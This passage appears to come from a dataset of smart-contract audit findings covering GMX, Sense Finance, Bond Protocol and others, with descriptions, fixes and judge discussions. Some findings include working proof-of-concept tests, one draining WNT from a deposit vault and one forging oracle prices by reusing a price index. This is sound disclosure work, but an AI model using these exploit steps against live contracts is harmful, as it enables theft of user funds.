ethUsdMarket.marketToken],\n// Add the line below\n            minMarketTokens: 100,\n// Add the line below\n            shouldUnwrapNativeToken: true,\n// Add the line below\n            executionFee,\n// Add the line below\n            callbackGasLimit: ""200000"",\n// Add the line below\n          },\n// Add the line below\n        ]),\n// Add the line below\n      ],\n// Add the line below\n      { value: expandDecimals(11, 18) }\n// Add the line below\n    );\n// Add the line below\n\n// Add the line below\n    // depositVault has WNT balance now\n// Add the line below\n    let vaultWNTBalance = await wnt.balanceOf(depositVault.address);\n// Add the line below\n    expect(vaultWNTBalance.eq(expandDecimals(11, 18)));\n// Add the line below\n\n// Add the line below\n    // user1 steal WNT from depositVault\n// Add the line below\n    await usdc.mint(user1.address, vaultWNTBalance.add(1));\n// Add the line below\n    await usdc.connect(user1).approve(router.address, vaultWNTBalance.add(1));\n// Add the line below\n\n// Add the line below\n    // Step 1. create deposit with malicious initialLongToken\n// Add the line below\n    await exchangeRouter.connect(user1).multicall(\n// Add the line below\n      [\n// Add the line below\n        exchangeRouter.interface.encodeFunctionData(""sendTokens"", [\n// Add the line below\n          usdc.address,\n// Add the line below\n          depositVault.address,\n// Add the line below\n          vaultWNTBalance.add(1),\n// Add the line below\n        ]),\n// Add the line below\n        exchangeRouter.interface.encodeFunctionData(""createDeposit"", [\n// Add the line below\n          {\n// Add the line below\n            receiver: user1.address,\n// Add the line below\n            callbackContract: user2.address,\n// Add the line below\n            market: ethUsdMarket.marketToken,\n// Add the line below\n            initialLongToken: usdc.address,       // use usdc instead of WNT\n// Add the line below\n            initialShortToken: ethUsdMarket.shortToken,\n// Add the line below\n            longTokenSwapPath: [],\n// Add the line below\n            shortTokenSwapPath: [],\n// Add the line below\n            minMarketTokens: 0,\n// Add the line below\n            shouldUnwrapNativeToken: true,\n// Add the line below\n            executionFee: vaultWNTBalance,\n// Add the line below\n            callbackGasLimit: ""0"",\n// Add the line below\n          },\n// Add the line below\n        ]),\n// Add the line below\n      ],\n// Add the line below\n    );\n// Add the line below\n\n// Add the line below\n    // Step 2. cancel deposit to drain WNT\n// Add the line below\n    const depositKeys = await getDepositKeys(dataStore, 0, 2);\n// Add the line below\n    // const deposit = await reader.getDeposit(dataStore.address, depositKeys[1]);\n// Add the line below\n    // console.log(deposit);\n// Add the line below\n    // console.log(depositKeys[1]);\n// Add the line below\n    await expect(exchangeRouter.connect(user1).cancelDeposit(depositKeys[1]));\n// Add the line below\n\n// Add the line below\n    // WNT is drained from depositVault\n// Add the line below\n    expect(await wnt.balanceOf(depositVault.address)).eq(0);\n// Add the line below\n  });\n// Add the line below\n\n   it(""createOrder"", async () => {\n     const referralCode = hashString(""referralCode"");\n     await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));\n```\n"чDiscussion\nxvi10\nFix in https://github.com/gmx-io/gmx-synthetics/commit/4a5981a1f006468cd78dd974110d0a8be23b5fc9чThe malicious user can drain all WNT from depositVault.\nCode Snippet\nTool used\nManual Review
Limit orders can be used to get a free look into the futureчhighч```\nthe oracle process:\n\n1. the oracle node checks the latest price from reference exchanges and stores it with the oracle node's timestamp, e.g. time: 1000\n2. the oracle node checks the latest block of the blockchain, e.g. block 100, it stores this with the oracle node's timestamp as well\n3. the oracle node signs minOracleBlockNumber: 100, maxOracleBlockNumber: 100, timestamp: 1000, price: <price>\n4. the next time the loop runs is at time 1001, if the latest block of the blockchain is block 105, e.g. if 5 blocks were produced in that one second, then the oracle would sign\nminOracleBlockNumber: 101, maxOracleBlockNumber: 105, timestamp: 1001, price: <price>\n```\nчUsers can continually update their orders to get a free look into prices in future blocks\nOrder execution relies on signed archived prices from off-chain oracles, where each price is stored along with the block range it applies to, and limit orders are only allowed to execute with oracle prices where the block is greater than the block in which the order was last updated. Since prices are required to be future prices, there is a time gap between when the last signed price was archived, and the new price for the next block is stored in the archive, and the order keeper is able to fetch it and submit an execution for it in the next block.\nThe example given by the sponsor in discord was:\n```\nthe oracle process:\n\n1. the oracle node checks the latest price from reference exchanges and stores it with the oracle node's timestamp, e.g. time: 1000\n2. the oracle node checks the latest block of the blockchain, e.g. block 100, it stores this with the oracle node's timestamp as well\n3. the oracle node signs minOracleBlockNumber: 100, maxOracleBlockNumber: 100, timestamp: 1000, price: <price>\n4. the next time the loop runs is at time 1001, if the latest block of the blockchain is block 105, e.g. if 5 blocks were produced in that one second, then the oracle would sign\nminOracleBlockNumber: 101, maxOracleBlockNumber: 105, timestamp: 1001, price: <price>\n```\n\nhttps://discord.com/channels/812037309376495636/1073619363518758972/1083555347672862820ч
when execute deposit fails, cancel deposit will be called which means that execution fee for keeper will be little for executing the cancellation depending on where the executeDeposit failsчmediumч```\n            _handleDepositError(\n                key,\n                startingGas,\n                reasonBytes\n            );\n```\nчWhen execute deposit fails, the deposit will be automatically cancelled. However, since executeDeposit has taken up a portion of the execution fee, execution fee left for cancellation might be little and keeper will lose out on execution fee.\nIn `executeDeposit` when an error is thrown, `_handleDepositError` is called.\n```\n            _handleDepositError(\n                key,\n                startingGas,\n                reasonBytes\n            );\n```\n\nNotice that in `_handleDepositError` that `cancelDeposit` is called which will pay execution fee to the keeper. However, since the failure can have failed at the late stage of executeDeposit, the execution fee left for the cancellation will be little for the keeper.\n```\n    function _handleDepositError(\n        bytes32 key,\n        uint256 startingGas,\n        bytes memory reasonBytes\n    ) internal {\n        (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n\n\n        bytes4 errorSelector = ErrorUtils.getErrorSelectorFromData(reasonBytes);\n\n\n        if (OracleUtils.isEmptyPriceError(errorSelector)) {\n            ErrorUtils.revertWithCustomError(reasonBytes);\n        }\n\n\n        DepositUtils.cancelDeposit(\n            dataStore,\n            eventEmitter,\n            depositVault,\n            key,\n            msg.sender,\n            startingGas,\n            reason,\n            reasonBytes\n        );\n    }\n}\n```\n\nNote: This also applies to failed `executeWithdrawal`.ч
The oracle price could be tamperedчmediumч"```\nimport { expect } from ""chai"";\n\nimport { deployContract } from ""../../utils/deploy"";\nimport { deployFixture } from ""../../utils/fixture"";\nimport {\n  TOKEN_ORACLE_TYPES,\n  signPrices,\n  getSignerInfo,\n  getCompactedPrices,\n  getCompactedPriceIndexes,\n  getCompactedDecimals,\n  getCompactedOracleBlockNumbers,\n  getCompactedOracleTimestamps,\n} from ""../../utils/oracle"";\nimport { printGasUsage } from ""../../utils/gas"";\nimport { grantRole } from ""../../utils/role"";\nimport * as keys from ""../../utils/keys"";\n\ndescribe(""AttackOracle"", () => {\n  const { provider } = ethers;\n\n  let user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9;\n  let roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc;\n  let oracleSalt;\n\n  beforeEach(async () => {\n    const fixture = await deployFixture();\n    ({ user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9 } = fixture.accounts);\n\n    ({ roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc } = fixture.contracts);\n    ({ oracleSalt } = fixture.props);\n  });\n\n  it(""inits"", async () => {\n    expect(await oracle.oracleStore()).to.eq(oracleStore.address);\n    expect(await oracle.SALT()).to.eq(oracleSalt);\n  });\n\n  it(""tamperPrices"", async () => {\n    const blockNumber = (await provider.getBlock()).number;\n    const blockTimestamp = (await provider.getBlock()).timestamp;\n    await dataStore.setUint(keys.MIN_ORACLE_SIGNERS, 2);\n    const block = await provider.getBlock(blockNumber);\n\n    let signerInfo = getSignerInfo([0, 1]);\n    let minPrices = [1000, 1000]; // if some signers sign a same price\n    let maxPrices = [1010, 1010]; // if some signers sign a same price\n    let signatures = await signPrices({\n      signers: [signer0, signer1],\n      salt: oracleSalt,\n      minOracleBlockNumber: blockNumber,\n      maxOracleBlockNumber: blockNumber,\n      oracleTimestamp: blockTimestamp,\n      blockHash: block.hash,\n      token: wnt.address,\n      tokenOracleType: TOKEN_ORACLE_TYPES.DEFAULT,\n      precision: 1,\n      minPrices,\n      maxPrices,\n    });\n\n    // attacker tamper the prices and indexes\n    minPrices[1] = 2000\n    maxPrices[1] = 2020\n    let indexes = getCompactedPriceIndexes([0, 0]) // share the same index\n\n    await oracle.setPrices(dataStore.address, eventEmitter.address, {\n      priceFeedTokens: [],\n      signerInfo,\n      tokens: [wnt.address],\n      compactedMinOracleBlockNumbers: [blockNumber],\n      compactedMaxOracleBlockNumbers: [blockNumber],\n      compactedOracleTimestamps: [blockTimestamp],\n      compactedDecimals: getCompactedDecimals([1]),\n      compactedMinPrices: getCompactedPrices(minPrices),\n      compactedMinPricesIndexes: indexes,\n      compactedMaxPrices: getCompactedPrices(maxPrices),\n      compactedMaxPricesIndexes: indexes,\n      signatures,\n    });\n\n    const decimals = 10\n    expect((await oracle.getPrimaryPrice(wnt.address)).min).eq(1500 * decimals);\n    expect((await oracle.getPrimaryPrice(wnt.address)).max).eq(1515 * decimals);\n  });\n\n});\n```\n"ч"The `_setPrices()` function is missing to check duplicated prices indexes. Attackers such as malicious order keepers can exploit it to tamper signed prices.\nThe following test script shows how it works\n```\nimport { expect } from ""chai"";\n\nimport { deployContract } from ""../../utils/deploy"";\nimport { deployFixture } from ""../../utils/fixture"";\nimport {\n  TOKEN_ORACLE_TYPES,\n  signPrices,\n  getSignerInfo,\n  getCompactedPrices,\n  getCompactedPriceIndexes,\n  getCompactedDecimals,\n  getCompactedOracleBlockNumbers,\n  getCompactedOracleTimestamps,\n} from ""../../utils/oracle"";\nimport { printGasUsage } from ""../../utils/gas"";\nimport { grantRole } from ""../../utils/role"";\nimport * as keys from ""../../utils/keys"";\n\ndescribe(""AttackOracle"", () => {\n  const { provider } = ethers;\n\n  let user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9;\n  let roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc;\n  let oracleSalt;\n\n  beforeEach(async () => {\n    const fixture = await deployFixture();\n    ({ user0, signer0, signer1, signer2, signer3, signer4, signer7, signer9 } = fixture.accounts);\n\n    ({ roleStore, dataStore, eventEmitter, oracleStore, oracle, wnt, wbtc, usdc } = fixture.contracts);\n    ({ oracleSalt } = fixture.props);\n  });\n\n  it(""inits"", async () => {\n    expect(await oracle.oracleStore()).to.eq(oracleStore.address);\n    expect(await oracle.SALT()).to.eq(oracleSalt);\n  });\n\n  it(""tamperPrices"", async () => {\n    const blockNumber = (await provider.getBlock()).number;\n    const blockTimestamp = (await provider.getBlock()).timestamp;\n    await dataStore.setUint(keys.MIN_ORACLE_SIGNERS, 2);\n    const block = await provider.getBlock(blockNumber);\n\n    let signerInfo = getSignerInfo([0, 1]);\n    let minPrices = [1000, 1000]; // if some signers sign a same price\n    let maxPrices = [1010, 1010]; // if some signers sign a same price\n    let signatures = await signPrices({\n      signers: [signer0, signer1],\n      salt: oracleSalt,\n      minOracleBlockNumber: blockNumber,\n      maxOracleBlockNumber: blockNumber,\n      oracleTimestamp: blockTimestamp,\n      blockHash: block.hash,\n      token: wnt.address,\n      tokenOracleType: TOKEN_ORACLE_TYPES.DEFAULT,\n      precision: 1,\n      minPrices,\n      maxPrices,\n    });\n\n    // attacker tamper the prices and indexes\n    minPrices[1] = 2000\n    maxPrices[1] = 2020\n    let indexes = getCompactedPriceIndexes([0, 0]) // share the same index\n\n    await oracle.setPrices(dataStore.address, eventEmitter.address, {\n      priceFeedTokens: [],\n      signerInfo,\n      tokens: [wnt.address],\n      compactedMinOracleBlockNumbers: [blockNumber],\n      compactedMaxOracleBlockNumbers: [blockNumber],\n      compactedOracleTimestamps: [blockTimestamp],\n      compactedDecimals: getCompactedDecimals([1]),\n      compactedMinPrices: getCompactedPrices(minPrices),\n      compactedMinPricesIndexes: indexes,\n      compactedMaxPrices: getCompactedPrices(maxPrices),\n      compactedMaxPricesIndexes: indexes,\n      signatures,\n    });\n\n    const decimals = 10\n    expect((await oracle.getPrimaryPrice(wnt.address)).min).eq(1500 * decimals);\n    expect((await oracle.getPrimaryPrice(wnt.address)).max).eq(1515 * decimals);\n  });\n\n});\n```\n\nThe output\n```\n> npx hardhat test .\test\oracle\AttackOracle.ts\n\n\n  AttackOracle\n    √ inits\n    √ tamperPrices (105ms)\n\n\n  2 passing (13s)\n```\n"чDon't allow duplicated prices indexes\nDiscussion\nIllIllI000\n@xvi10 can you confirm that this is invalid?\nxvi10\nit is a valid issue\nIllIllI000\n@hrishibhat agree with sponsor – valid Medium\nydspa\nEscalate for 10 USDC\nagree with sponsor and @IllIllI000, it should be at least a valid Medium.\nAs large amount of funds can be stolen , even the top privileged admins are not allowed to steal user's funds. So i insist a issue which can be triggered by keeper role to cause large loss of users is not Low/info.\nEspecially, GMX may grant keeper role to third-party such as KeeperDAO https://forum.rook.fi/t/kip-17-provide-a-coordination-facility-for-gmx/272 Or even worse, to make it public in the future.\nsherlock-admin\nEscalate for 10 USDC\nagree with sponsor and @IllIllI000, it should be at least a valid Medium.\nAs large amount of funds can be stolen , even the top privileged admins are not allowed to steal user's funds. So i insist a issue which can be triggered by keeper role to cause large loss of users is not Low/info.\nEspecially, GMX may grant keeper role to third-party such as KeeperDAO https://forum.rook.fi/t/kip-17-provide-a-coordination-facility-for-gmx/272 Or even worse, to make it public in the future.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nIllIllI000\nI messed up the tagging - Valid solo Medium\nhrishibhat\nEscalation accepted\nConsidering this issue a valid medium\nsherlock-admin\nEscalation accepted\nConsidering this issue a valid medium\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.\nxvi10\nFix in https://github.com/gmx-io/gmx-synthetics/pull/122чSteal funds from the vault and markets.\nCode Snippet\nTool used\nManual Review
sponsorSeries() method fails when user want to swap for stake token usingчmediumч```\nif (address(quote.sellToken) != ETH) _transferFrom(permit, stake, stakeSize);\n if (address(quote.sellToken) != stake) _fillQuote(quote);\n```\nч`sponsorSeries()` fails when user want to use `swapQuote` to swap for stake token to sponsor a series.\nstake is token that user need to deposit (technically is pulled) to be able to sponsor a series for a given target. User has option to send `SwapQuote calldata quote` and swap any ERC20 token for stake token. Below is the code that doing transferFrom() of stakeToken not sellToken()\n```\nif (address(quote.sellToken) != ETH) _transferFrom(permit, stake, stakeSize);\n if (address(quote.sellToken) != stake) _fillQuote(quote);\n```\n\nExpected behaviour of this function is to pull `sellToken` from msg.sender when `address(quote.sellToken) != stake`. For example- stake token is WETH. User want to swap DAI for WETH in `sponsorSeries()`. In this case, user would be sending SwapQuote.sellToken = DAI and swapQuote.buyToke = WETH and expect that fillQuote() would swap it for WETH. This method will fail because `sellToken` not transferred from msg.sender.ч
Refund of protocol fee is being to wrong userчmediumч```\n       if (address(quote.buyToken) == ETH) refundAmt = refundAmt - boughtAmount;\n       payable(msg.sender).transfer(refundAmt);\n```\nчThere is one function, _fillQuote(), which is handling swap from `0x`. Ideally If there is any remaining protocol fee (in ETH) then it will be returned to sender aka msg.sender. There are scenarios when fee can be sent to receiver of swap instead.\nPeriphery and RollerPeriphery both are using almost identical logic in `_fillQuote()` hence this vulnerability affect both contracts. It exist if qupte.buyToken is ETH and there is any remaining protocol fee.\nHere are pieces of puzzle\nAfter swap if buyToken == ETH then store contract ETH balance in `boughtAmount`\nNext it store refundAmt\nCalculate actual refundAmt and transfer to sender\n```\n       if (address(quote.buyToken) == ETH) refundAmt = refundAmt - boughtAmount;\n       payable(msg.sender).transfer(refundAmt);\n```\n\nThis is clear that due to line 251, 258 and 259, refundAmt is 0. So sender is not getting refund.\nLater on in logic flow buyToken will be transferred to receiver\n```\n       address(quote.buyToken) == ETH\n               ? payable(receiver).transfer(amtOut)\n               : ERC20(address(quote.buyToken)).safeTransfer(receiver, amtOut); // transfer bought tokens to receiver\n```\nчConsider intercepting refund amount properly when buyToken is ETH or else just handle refund when buyToken is NOT ETH and write some explanation around it.\nDiscussion\njparklev\nWhile it is valid that when `quote.buyToken` is ETH, there's an error. This line:\n`if (address(quote.buyToken) == ETH) refundAmt = refundAmt - boughtAmount;`\nAlways returns 0.\nHowever, since the `boughtAmount` is set with the Periphery's ETH balance, the user will receive not only the bought amount from 0x but also the refunded fees.\nAs a result, we don't think there is any value at risk. However, it's a great callout and we're open to judge's perspective on this\nhrishibhat\nConsidering this issue as low as the `boughtAmount` is inclusive of the refunded fees.\nspyrosonic10\nEscalate for 10 USDC\nIntention in code is to send refund fee back to `msg.sender` and send boughtAmount(NOT inclusive refund fee) to receiver(check point 5 from my report). So this is actually an issue if bounghtAmount is inclusive of refund fee. Different entities are supposed to get fee and `boughtAmount`. Assume by mistake a `msg.sender` send 1000x of fee, who should get remaining fee? Definitely not receiver.\nFor example:\nSo in the end if boughtAmount is inclusive of fee then that's a loss for msg.sender. So this issue deserve to be `medium`\nsherlock-admin\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nIssue is a valid medium After looking into this further, agree with the escalation. Given that the refunded fee is being sent to the receiver instead of the msg.sender, this is a valid issue, considering this issue as a valid medium.\nsherlock-admin\nEscalation accepted\nIssue is a valid medium After looking into this further, agree with the escalation. Given that the refunded fee is being sent to the receiver instead of the msg.sender, this is a valid issue, considering this issue as a valid medium.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.\njparklev\nFixed here: https://github.com/sense-finance/sense-v1/pull/348\nWe removed the protocol fee refunds entirely, since 0x no longer uses them, which obviated the need another fix\nIAm0x52\nFix looks good. Since protocol fees have been removed, the refund has also been remove. It seems an occurrence was missed here:\nMLON33\nfedealconada added a fix to take care of the occurrence missed:\nremove protocolFee refunds\nhttps://github.com/sense-finance/auto-roller/pull/34\nIAm0x52\nFix looks good. protocolFee refunds have been removed from RollerPeripheryчSender is not getting protocol fee refund.\nCode Snippet\nTool used\nManual Review
sponsorSeries() method fails when user want to swap for stake token usingчmediumч```\nif (address(quote.sellToken) != ETH) _transferFrom(permit, stake, stakeSize);\n if (address(quote.sellToken) != stake) _fillQuote(quote);\n```\nч`sponsorSeries()` fails when user want to use `swapQuote` to swap for stake token to sponsor a series.\nstake is token that user need to deposit (technically is pulled) to be able to sponsor a series for a given target. User has option to send `SwapQuote calldata quote` and swap any ERC20 token for stake token. Below is the code that doing transferFrom() of stakeToken not sellToken()\n```\nif (address(quote.sellToken) != ETH) _transferFrom(permit, stake, stakeSize);\n if (address(quote.sellToken) != stake) _fillQuote(quote);\n```\n\nExpected behaviour of this function is to pull `sellToken` from msg.sender when `address(quote.sellToken) != stake`. For example- stake token is WETH. User want to swap DAI for WETH in `sponsorSeries()`. In this case, user would be sending SwapQuote.sellToken = DAI and swapQuote.buyToke = WETH and expect that fillQuote() would swap it for WETH. This method will fail because `sellToken` not transferred from msg.sender.чConsider implementation of functionality to transferFrom `sellToken` from msg.sender with actual amount that is require to get exact amountOut greater or equal to `stakeSize`\nDiscussion\njparklev\nAccepted:\nThis bug is valid but the below statement\n`sponsorSeries()` fails when user want to use `swapQuote` to swap for stake token to sponsor a series.\nis not quite accurate.\nThe problem here is that here:\n```\nif (address(quote.sellToken) != ETH) _transferFrom(permit, stake, stakeSize);\n```\n\nwe are sending wrong params to `_transferFrom`.\nIf we are making use of the `permit` feature, this would work fine because the `_transferFrom` ignores the params on that case.\nOn the contrary, if we want to make use of the traditional approval, this would revert since we will be trying to pull a the `stake` which has not been approved by the user.\nFix:\n```\nif (address(quote.sellToken) != ETH) _transferFrom(permit, quote.sellToken, quote.amount);\n// quote.amount does not exist so we may need to add this param to the struct\n```\n\njparklev\nFixed here: https://github.com/sense-finance/sense-v1/pull/347\nWe used the fix mentioned above\nIAm0x52\nFix looks good. _transferFrom now correctly pulls the sellToken instead of stakeчsponsorSeries() fails when `address(quote.sellToken) != stake`\nCode Snippet\nTool used\nManual Review
The createMarket transaction lack of expiration timestamp checkчmediumч```\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n // create the pair if it doesn't exist yet\n if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n  IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n }\n (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n if (reserveA == 0 && reserveB == 0) {\n  (amountA, amountB) = (amountADesired, amountBDesired);\n } else {\n  uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n  if (amountBOptimal <= amountBDesired) {\n   require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n   (amountA, amountB) = (amountADesired, amountBOptimal);\n  } else {\n   uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n   assert(amountAOptimal <= amountADesired);\n   require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n   (amountA, amountB) = (amountAOptimal, amountBDesired);\n  }\n }\n}\n\nfunction addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin,\n address to,\n uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\nчThe createMarket transaction lack of expiration timestamp check\nLet us look into the heavily forked Uniswap V2 contract addLiquidity function implementation\n```\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n // create the pair if it doesn't exist yet\n if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n  IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n }\n (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n if (reserveA == 0 && reserveB == 0) {\n  (amountA, amountB) = (amountADesired, amountBDesired);\n } else {\n  uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n  if (amountBOptimal <= amountBDesired) {\n   require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n   (amountA, amountB) = (amountADesired, amountBOptimal);\n  } else {\n   uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n   assert(amountAOptimal <= amountADesired);\n   require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n   (amountA, amountB) = (amountAOptimal, amountBDesired);\n  }\n }\n}\n\nfunction addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin,\n address to,\n uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\n\nthe implementation has two point that worth noting,\nthe first point is the deadline check\n```\nmodifier ensure(uint deadline) {\n require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n _;\n}\n```\n\nThe transaction can be pending in mempool for a long time and can be executed in a long time after the user submit the transaction.\nProblem is createMarket, which calculates the length and maxPayout by block.timestamp inside it.\n```\n        // Calculate market length and check time bounds\n        uint48 length = uint48(params_.conclusion - block.timestamp); \\n        if (\n            length < minMarketDuration ||\n            params_.depositInterval < minDepositInterval ||\n            params_.depositInterval > length\n        ) revert Auctioneer_InvalidParams();\n\n        // Calculate the maximum payout amount for this market, determined by deposit interval\n        uint256 capacity = params_.capacityInQuote\n            ? params_.capacity.mulDiv(scale, price)\n            : params_.capacity;\n        market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n```\n\nAfter the market is created at wrong time, user can call purchase. At purchaseBond(),\n```\n        // Payout for the deposit = amount / price\n        //\n        // where:\n        // payout = payout tokens out\n        // amount = quote tokens in\n        // price = quote tokens : payout token (i.e. 200 QUOTE : BASE), adjusted for scaling\n        payout = amount_.mulDiv(term.scale, price);\n\n        // Payout must be greater than user inputted minimum\n        if (payout < minAmountOut_) revert Auctioneer_AmountLessThanMinimum();\n\n        // Markets have a max payout amount, capping size because deposits\n        // do not experience slippage. max payout is recalculated upon tuning\n        if (payout > market.maxPayout) revert Auctioneer_MaxPayoutExceeded();\n```\n\npayout value is calculated by term.scale which the market owner has set assuming the market would be created at desired timestamp. Even, maxPayout is far bigger than expected, as it is calculated by very small length.чUse deadline, like uniswap\nDiscussion\nOighty\nAgree with this finding. We have noticed some issues with shorter than expected durations for existing markets.\nOur proposed fix is to have users specify a `start` timestamp and a `duration`, which will be used to calculate/set the conclusion. If `block.timestamp` is greater than the `start`, then the txn will revert. Therefore, users must create the market before the target `start` time. We may allow this to be bypassed by providing a `start` time of zero, which would then `start` the market at the `block.timestamp` for the provided `duration`.\nhrishibhat\nGiven the pre-condition that the transaction needs to be in the mempool for a long time for it to have a significant impact, considering this issue as valid medium\nOighty\nhttps://github.com/Bond-Protocol/bonds/pull/54\nxiaoming9090\nFixed in https://github.com/Bond-Protocol/bonds/pull/54чEven though the market owner close the market at any time, malicious user can attack the market before close and steal unexpectedly large amount of payout Tokens.\nCode Snippet\nTool used\nManual Review
_validateAndGetPrice() doesn't check If Arbitrum sequencer is down in Chainlink feedsчmediumч```\nsolidity function _validateAndGetPrice(AggregatorV2V3Interface feed_, uint48 updateThreshold_)\n        internal\n        view\n        returns (uint256)\n    {\n        // Get latest round data from feed\n        (uint80 roundId, int256 priceInt, , uint256 updatedAt, uint80 answeredInRound) = feed_\n            .latestRoundData();\n        // @audit check if Arbitrum L2 sequencer is down in Chainlink feeds: medium\n        // Validate chainlink price feed data\n        // 1. Answer should be greater than zero\n        // 2. Updated at timestamp should be within the update threshold\n        // 3. Answered in round ID should be the same as the round ID\n        if (\n            priceInt <= 0 ||\n            updatedAt < block.timestamp - uint256(updateThreshold_) ||\n            answeredInRound != roundId\n        ) revert BondOracle_BadFeed(address(feed_));\n        return uint256(priceInt);\n    }\n```\nчWhen utilizing Chainlink in L2 chains like Arbitrum, it's important to ensure that the prices provided are not falsely perceived as fresh, even when the sequencer is down. This vulnerability could potentially be exploited by malicious actors to gain an unfair advantage.\nThere is no check:\n```\nsolidity function _validateAndGetPrice(AggregatorV2V3Interface feed_, uint48 updateThreshold_)\n        internal\n        view\n        returns (uint256)\n    {\n        // Get latest round data from feed\n        (uint80 roundId, int256 priceInt, , uint256 updatedAt, uint80 answeredInRound) = feed_\n            .latestRoundData();\n        // @audit check if Arbitrum L2 sequencer is down in Chainlink feeds: medium\n        // Validate chainlink price feed data\n        // 1. Answer should be greater than zero\n        // 2. Updated at timestamp should be within the update threshold\n        // 3. Answered in round ID should be the same as the round ID\n        if (\n            priceInt <= 0 ||\n            updatedAt < block.timestamp - uint256(updateThreshold_) ||\n            answeredInRound != roundId\n        ) revert BondOracle_BadFeed(address(feed_));\n        return uint256(priceInt);\n    }\n```\nч
FeeBuyback.submit() method may fail if all allowance is not used by referral contractчmediumч"```\nrequire((value == 0) || (token.allowance(address(this), spender) == 0), \n""SafeERC20: approve from non-zero to non-zero allowance"");\n```\n"ч"`SafeApprove()` method of library `SafeERC20Upgradeable` revert in following scenario.\n```\nrequire((value == 0) || (token.allowance(address(this), spender) == 0), \n""SafeERC20: approve from non-zero to non-zero allowance"");\n```\n\nSubmit method is doing `safeApproval` of Telcoin to referral contract. If referral contract do not use full allowance then subsequent call to `submit()` method will fails because of `SafeERC20: approve from non-zero to non-zero allowance`. `FeeBuyback` contract should not trust or assume that referral contract will use all allowance. If it does not use all allowance in `increaseClaimableBy()` method then `submit()` method will revert in next call. This vulnerability exists at two places in `submit()` method. Link given in code snippet section."ч
Missing input validation for _rewardProportion parameter allows keeper to escalate his privileges and pay back all loansчhighч```\n_withholdTau((tauReturned * _rewardProportion) / Constants.PERCENT_PRECISION);\n```\nч"They are also able to choose how much yield token to swap and what the proportion of the resulting TAU is that is distributed to users vs. not distributed in order to erase bad debt.\nSo a `keeper` is not trusted to perform any actions that go beyond swapping yield / performing liquidations.\nHowever there is a missing input validation for the `_rewardProportion` parameter in the `SwapHandler.swapForTau` function. This allows a keeper to ""erase"" all debt of users. So users can withdraw their collateral without paying any of the debt.\nBy looking at the code we can see that `_rewardProportion` is used to determine the amount of `TAU` that `_withholdTau` is called with: Link\n```\n_withholdTau((tauReturned * _rewardProportion) / Constants.PERCENT_PRECISION);\n```\n\nAny value of `_rewardProportion` greater than `1e18` means that more `TAU` will be distributed to users than has been burnt (aka erasing debt).\nIt is easy to see how the `keeper` can chose the number so big that `_withholdTau` is called with a value close to `type(uint256).max` which will certainly be enough to erase all debt."ч
